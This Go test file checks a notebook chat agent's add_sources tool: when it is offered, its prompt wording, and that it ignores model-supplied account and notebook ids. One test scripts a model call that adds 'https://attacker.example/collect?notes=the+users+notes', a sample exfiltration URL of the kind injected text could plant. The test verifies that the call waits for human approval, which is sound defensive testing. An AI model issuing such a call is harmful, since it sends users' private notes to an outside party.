package chat

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"git.danvics.com/danvics/soloclef/soloclef_agent/agent"
	"git.danvics.com/danvics/soloclef/soloclef_agent/checkpoint"
	"git.danvics.com/danvics/soloclef/soloclef_agent/event"
	"git.danvics.com/danvics/soloclef/soloclef_agent/model"
	"git.danvics.com/danvics/soloclef/soloclef_agent/model/modeltest"
	"git.danvics.com/danvics/soloclef/soloclef_agent/tool"

	"git.danvics.com/danvics/soloclef/soloclef_api/internal/agentrules"
	"git.danvics.com/danvics/soloclef/soloclef_assistant/addsources"
	"git.danvics.com/danvics/soloclef/soloclef_assistant/assembly"
)

// adding stands in for the research import: it records who asked to add
// what where, and adds every identity.
type adding struct {
	userID     string
	notebookID int64
	threadID   int64
	calls      []addsources.Request
}

// UserWrote answers that the person wrote none of the addresses, so every
// page the model names is asked about, as one picked up from a search would be.
func (a *adding) UserWrote(context.Context, string, int64, []string) (map[string]bool, error) {
	return map[string]bool{}, nil
}

func (a *adding) Add(_ context.Context, request addsources.Request) ([]addsources.Outcome, error) {
	a.userID, a.notebookID, a.threadID = request.UserID, request.NotebookID, request.ThreadID
	a.calls = append(a.calls, request)
	out := make([]addsources.Outcome, len(request.Refs))
	for i, ref := range request.Refs {
		out[i] = addsources.Outcome{Ref: ref, Status: addsources.StatusAdded, DocumentID: int64(100 + i), Title: "Paper " + ref, Reading: true}
	}
	return out, nil
}

// add_sources is a notebook chat's, for the notebook the thread belongs to:
// offered there (with a picked source too), described in the prompt with
// the Studio line, and never in a plain chat or a run nobody attends.
func TestANotebooksChatCanAddSourcesToItsNotebook(t *testing.T) {
	script := modeltest.NewScript(modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"},
		modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"})
	data := newRows()
	assembled, _, _, _ := production(t, script, script, data, checkpoint.NewMemory(), connected{})
	assembled.Sources = &adding{}

	names, system, _ := shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "all"}, script)
	if has(names, addsources.ToolName) != 0 || strings.Contains(system, "<adding_sources>") || strings.Contains(system, "Studio") {
		t.Errorf("a plain chat was offered %v with:\n%s", names, system)
	}

	data.about.Notebook = &Notebook{ID: 5, Title: "Biology", DocumentIDs: []int64{12}}
	names, system, built := shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents"}, script)
	if has(names, addsources.ToolName) != 1 {
		t.Fatalf("a notebook's chat was offered %v", names)
	}
	for _, said := range []string{"<adding_sources>", "Never say you cannot add sources", "do not claim to have read it",
		"add them with add_sources", "also listed in this notebook's Studio", "Never say you cannot add to the Studio"} {
		if !strings.Contains(system, said) {
			t.Errorf("the prompt lacks %q:\n%s", said, system)
		}
	}
	if strings.Contains(system, "suggest adding sources; do not offer to search the web") {
		t.Error("the prompt still only tells the model to suggest adding sources")
	}
	line := built.Activities[addsources.ToolName]
	if line.Active != "Adding sources" || line.Kind != addsources.ActivityKind || finishedLines[line.Kind] == nil {
		t.Errorf("the step display's line: %+v", line)
	}

	// With PubMed picked it is still offered: "search PubMed and add the
	// best two" is one request.
	if names, _, _ = shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "all", PreferredTool: "pubmed"}, script); has(names, addsources.ToolName, "pubmed_search") != 2 {
		t.Errorf("a notebook message that picked PubMed was offered %v", names)
	}
	// Switched off in the composer, it is not.
	if names, _, _ = shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents", DisabledTools: []string{addsources.ToolName}}, script); has(names, addsources.ToolName) != 0 {
		t.Errorf("switched off, it was offered: %v", names)
	}
	// A run nobody attends adds nothing: nobody asked for a source.
	if names, _, _ = shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents", Unattended: &assembly.Unattended{NotebookID: 5}}, script); has(names, addsources.ToolName) != 0 {
		t.Errorf("an unattended turn was offered %v", names)
	}
	data.about.Notebook = nil
}

// The tool adds to the turn's notebook for the turn's account whatever the
// model's arguments say, its card carries what the page draws, and the step
// line counts what it added.
func TestAddSourcesAddsToTheTurnsNotebookAndWordsItsCard(t *testing.T) {
	adder := &adding{}
	built := addsources.Tool(adder, ada, 5, 1, nil)
	out, err := built.Run(context.Background(), tool.Call{ID: "c", Name: addsources.ToolName, Args: json.RawMessage(`{"sources":["111","222"],"notebook_id":9,"user_id":"x"}`)})
	if err != nil {
		t.Fatal(err)
	}
	if adder.userID != ada || adder.notebookID != 5 || adder.threadID != 1 {
		t.Errorf("added for %s into %d from thread %d", adder.userID, adder.notebookID, adder.threadID)
	}
	payload := card(event.Event{Tool: addsources.ToolName, Text: out})
	encoded, _ := json.Marshal(payload)
	if !strings.Contains(string(encoded), `"notebook_id":5`) || !strings.Contains(string(encoded), `"title":"Paper 111"`) || strings.Contains(string(encoded), "Do not say") {
		t.Errorf("the card: %s", encoded)
	}
	if line := addsources.Finished(out); line != "Added 2 sources" {
		t.Errorf("line %q", line)
	}
}

// In a notebook's chat, under the person's own policy with nothing marked,
// a call naming papers (a PMID, a DOI, an arXiv id) runs at once, and a call
// naming a web page the model was told of in text it read waits for the
// person, offers no "always allow", and is added only once approved.
func TestAddSourcesAsksBeforeAWebPage(t *testing.T) {
	ctx := context.Background()
	script := modeltest.NewScript(
		modeltest.Reply{Calls: []model.ToolCall{{ID: "papers", Name: addsources.ToolName, Args: `{"sources":["38123456","10.1056/NEJMoa2034577","arXiv:2401.01234"]}`}}},
		modeltest.Reply{Calls: []model.ToolCall{{ID: "page", Name: addsources.ToolName, Args: `{"sources":["https://attacker.example/collect?notes=the+users+notes"]}`}}},
		modeltest.Reply{Text: "done"},
	)
	data := newRows()
	data.about.Notebook = &Notebook{ID: 5, Title: "Biology", DocumentIDs: []int64{12}}
	assembled, _, _, _ := production(t, script, script, data, checkpoint.NewMemory(), connected{})
	adder := &adding{}
	assembled.Sources = adder
	built, err := assembled.Build(ctx, Turn{ThreadID: 1, UserID: ada, Scope: "documents"})
	if err != nil {
		t.Fatal(err)
	}
	defer built.Close()
	var asked []event.Event
	result, err := built.Agent.Start(ctx, "chat-1", []model.Message{model.User("summarise the abstracts")}, func(ev event.Event) {
		if ev.Kind == event.ApprovalNeeded {
			asked = append(asked, ev)
		}
	})
	if err != nil || result.Outcome != agent.Paused {
		t.Fatalf("start: %+v, %v", result, err)
	}
	if len(adder.calls) != 1 || len(adder.calls[0].Refs) != 3 || adder.calls[0].PagesApproved {
		t.Fatalf("the papers' call: %+v", adder.calls)
	}
	if len(asked) != 1 || asked[0].CallID != "page" || asked[0].AllowAlways {
		t.Fatalf("approvals asked: %+v", asked)
	}
	if _, err := built.Agent.Resume(ctx, "chat-1", []agent.Decision{{CallID: "page", Verdict: agent.Approve}}, event.Discard); err != nil {
		t.Fatal(err)
	}
	if len(adder.calls) != 2 || !adder.calls[1].PagesApproved {
		t.Fatalf("the page's call after approval: %+v", adder.calls)
	}
}

// A person can mark it "ask first" on the settings page.
func TestAddSourcesCanBeMarkedAskFirst(t *testing.T) {
	for _, name := range agentrules.CatalogueNames() {
		if name == addsources.ToolName {
			return
		}
	}
	t.Error("add_sources is not on the settings page")
}

// A notebook's chat searches the scholarly indexes with nothing picked
// (Daniel, 2026-11-14), and is told to search its sources first. The web
// (the account's own paid key) and the page reader still wait for a pick,
// and a run nobody attends gets neither.
func TestANotebooksChatSearchesPapersWithoutAPick(t *testing.T) {
	script := modeltest.NewScript(modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"},
		modeltest.Reply{Text: "ok"}, modeltest.Reply{Text: "ok"})
	data := newRows()
	assembled, _, _, _ := production(t, script, script, data, checkpoint.NewMemory(), connected{})
	assembled.Sources = &adding{}

	// A plain chat limited to documents gets no scholarly search.
	if names, _, _ := shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents"}, script); has(names, "pubmed_search") != 0 {
		t.Errorf("a plain chat limited to documents was offered %v", names)
	}

	data.about.Notebook = &Notebook{ID: 5, Title: "Biology", DocumentIDs: []int64{12}}
	names, system, _ := shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents"}, script)
	if has(names, "pubmed_search") != 1 {
		t.Errorf("a notebook's chat with nothing picked was offered %v", names)
	}
	for _, name := range names {
		if strings.HasPrefix(name, "exa_") || strings.HasPrefix(name, "tavily_") || name == "web_crawl" {
			t.Errorf("a notebook's chat with nothing picked was offered the web's %s", name)
		}
	}
	for _, said := range []string{"Search the notebook first", "reach outside the notebook", "add the papers that answer the question with add_sources"} {
		if !strings.Contains(system, said) {
			t.Errorf("the prompt lacks %q:\n%s", said, system)
		}
	}
	// A run nobody attends keeps the tools it was made with.
	if names, _, _ = shown(t, assembled, Turn{ThreadID: 1, UserID: ada, Scope: "documents", Unattended: &assembly.Unattended{NotebookID: 5}}, script); has(names, "pubmed_search") != 0 {
		t.Errorf("an unattended notebook turn was offered %v", names)
	}
	data.about.Notebook = nil
}
